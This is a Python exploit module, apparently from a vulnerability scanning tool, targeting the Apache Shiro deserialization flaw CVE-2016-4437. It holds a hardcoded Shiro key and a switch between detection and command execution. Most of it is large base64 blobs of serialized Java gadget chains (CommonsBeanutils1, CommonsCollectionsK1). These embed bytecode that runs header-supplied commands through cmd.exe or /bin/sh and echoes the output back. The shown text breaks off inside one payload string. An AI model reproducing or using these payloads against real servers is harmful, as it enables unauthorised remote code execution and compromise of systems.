import CodeTest
import base64,uuid,requests,re
from Crypto.Cipher import AES
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
################
##--ApacheShiro--##
#cve_2016_4437 反序列化命令执行(可回显)
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
#命令执行修改参数
SHIRO_KEY = 'fCq+/xW488hMTCD+cmJ3aQ=='
SHIRO_GADGET = 'CommonsBeanutils1'
TIMEOUT = 10
class ApacheShiro():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2016_4437 = ("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"
            "==")
        self.CommonsBeanutils1 = ("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3"
            "J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3"
            "LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS"
            "5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3"
            "BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8"
            "FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS"
            "9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD///"
            "//dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vT0RLWmZ0SndiBwABAQ"
            "AQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29PREtaZnRKd2IuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW"
            "5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQ"
            "AHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKU"
            "xqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWV"
            "BFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYX"
            "ZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQ"
            "AYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdD"
            "spTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1"
            "dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby"
            "5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTW"
            "FwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2"
            "V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYX"
            "ZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZz"
            "spVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAF"
            "EAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2"
            "JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA"
            "1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbm"
            "cvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE"
            "5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2"
            "VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgA"
            "EAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAI"
            "sLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcg"
            "gAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZX"
            "N0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZz"
            "spTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIAL"
            "ABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZG"
            "VyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAvwDACg"
            "C7AMEBABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAMUAxgoAxA"
            "DHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAjAMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3"
            "RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0Qnl0ZXMBAAQoKVtCDADVANYKAF"
            "wA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKYA3QEAE2phdmEvdXRpbC"
            "9IYXNodGFibGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQBAY29tL3N1bi9vcmcvYXBhY2"
            "hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAAAAAADAAoABwAIAAIAPA"
            "AAANwACAAFAAAAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7ABpZA7cAJlNZBbsAGlkrvr"
            "cAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACItBL0ABFkDK1O2ACxNKr"
            "YAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3/QBEBwAEBwAMAD0AAAAEAAEAPw"
            "AKAEEAQgACADwAAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEZNpwAWpwAAOgQttgBLTqcAAy0SBKb/5ywBpgAMuwBIWSu3AE6/LAS2AF"
            "QsKrYAWrAAAQAKABMAFgBIAAEAQAAAACUABv0ACgcAVgcADAj/AAIABAcABAcAXAcAVgcADAABBwBICQUNAD0AAAAEAAEAPwABACMAXQ"
            "ACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQM2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqcCCRkHtgBzTi0SdbYAeZ"
            "oADC0Se7YAeZoABqcB7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe4AG3AAIk6CQM2ChUKGQ"
            "m5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1KwO9AAS2ACxNK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKYU7"
            "YALMAAXE4tAaUACi22AJyZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADASoAW9AAxZAxJcU1"
            "kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKiU7YALMAAXE4tAaUACi22AJyZAAanAI"
            "0stgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq+2AHmZABgGvQBcWQMSsVNZBBKzU1kFLVOnAB"
            "UGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC+tgDCtgDItwDLEs22ANG2ANS2ANi4ANoENgQtAaUACi22AJyZAAgVBJoABq"
            "cAECy4AN62AOO2ANi4ANoVBJkABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAD8AAQBAAAAA3QAZ/wAaAAcHAAIAAAABBw"
            "BvAQAA/AAXBwBh/wAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC/wARAAgHAAIHAAQABwBcAQcAbwEHAGEAAFMHAD8E/wACAAgHAAIHAAQABw"
            "BcAQcAbwEHAGEAAP4ADQAHAIkB/wBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC+wBULgL7AE1RBwDlKQsEAgwH/wAFAA"
            "sHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA/wAHAAgHAAIAAAABBwBvAQcAYQAA+gAFAD0AAAAEAAEAPwABAAUAAAACAAZ1cQB+ABAAAA"
            "HUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPG"
            "luaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lck"
            "NsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACg"
            "ALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYW"
            "xpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAA"
            "EADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEA"
            "AJcHQABFB3bnJwdwEAeHEAfgANeA==")
        self.CommonsCollectionsK1 = ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9"
            "sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnm"
            "KrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3J"
            "nLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5"
            "fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWx"
            "hbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmc"
            "vQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGl"
            "lczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29"
            "vOFZ0d1NZRlUHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb284VnR3U1lGVS5qYXZhAQAJd3JpdGVCb2R"
            "5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2x"
            "hbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXd"
            "JbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW5"
            "0ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5"
            "nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEk"
            "pVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZ"
            "hL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAA"
            "tAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgc"
            "ANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9"
            "uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5"
            "nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAB"
            "DAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZ"
            "hL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3N"
            "pYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDs"
            "pTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5"
            "nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAE"
            "AGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJ"
